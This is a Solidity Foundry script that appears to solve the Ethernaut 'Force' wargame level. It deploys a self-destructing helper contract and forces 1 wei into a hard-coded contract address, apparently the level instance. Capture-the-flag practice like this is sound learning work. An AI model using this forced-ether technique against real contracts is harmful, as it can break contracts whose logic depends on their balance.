// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Selfdestruct} from "../../test/Ethernaut/Force.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Selfdestruct _selfdestruct = new Selfdestruct();
        _selfdestruct.force{value: 1}(
            0x099c2ddeAcfe7ABA5A03bf130B6181B3B5c8DeD7
        );
        vm.stopBroadcast();
    }
}
